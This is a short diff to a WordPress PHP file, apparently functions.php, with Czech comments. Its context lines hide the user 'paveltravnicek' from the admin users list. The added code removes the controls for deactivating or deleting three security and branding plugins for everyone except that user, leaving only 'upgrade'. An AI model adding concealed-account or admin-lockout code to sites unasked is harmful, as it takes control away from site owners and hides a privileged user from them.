@@ -110,4 +110,28 @@ function hide_paveltravnicek_from_users_list($query) {
 }
 add_action('pre_user_query', 'hide_paveltravnicek_from_users_list');
 
+function omezit_spravu_pluginu($actions, $plugin_file, $plugin_data, $context) {
+    // Povolené pluginy, které chceme chránit
+    $chranene_plugins = [
+        'wp-defender/wp-defender.php',
+        'ultimate-branding/ultimate-branding.php',
+        'wpmudev-updates/update-notifications.php'
+    ];
+
+    // Aktuální uživatel
+    $current_user = wp_get_current_user();
+
+    // Pokud není přihlášený uživatel "paveltravnicek" a plugin je v seznamu chráněných
+    if ($current_user->user_login !== 'paveltravnicek' && in_array($plugin_file, $chranene_plugins)) {
+        // Ponecháme pouze možnost aktualizace
+        return array_intersect_key($actions, array_flip(['upgrade']));
+    }
+
+    return $actions;
+}
+
+add_filter('plugin_action_links', 'omezit_spravu_pluginu', 10, 4);
+add_filter('network_admin_plugin_action_links', 'omezit_spravu_pluginu', 10, 4);
+
+
 ?>
